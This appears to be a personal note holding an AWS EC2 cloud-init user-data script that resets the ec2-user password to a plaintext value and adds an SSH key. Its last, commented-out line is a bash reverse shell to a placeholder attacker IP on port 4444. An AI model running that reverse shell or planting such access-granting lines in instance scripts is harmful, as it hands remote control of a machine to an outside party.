# user-data

**Author:** Julien Bongars  
**Date:** 2025-12-22 21:38:26
**Path:**

---

**Change Password for EC2-instance**

```shell
Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
  - [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
# your script goes here....

# change password for ec2-user
echo 'ec2-user:migraine-buddy-user-1123' | chpasswd

# add ssh public key
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM0M0hjLvNVV8KKu4Ko6bZbnafwgcf7vmM/GQe3VHbiW julien' >> /home/ec2-user/.ssh/authorized_keys

# install SSM manager
# source: https://docs.aws.amazon.com/systems-manager/latest/userguide/agent-install-rhel-8-9.html
# dnf install -y https://s3.amazonaws.com/ec2-downloads-windows/SSMAgent/latest/linux_amd64/amazon-ssm-agent.rpm
# systemctl start amazon-ssm-agent && systemctl enable amazon-ssm-agent

# connect to foreign ip address
# bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
--//--
```
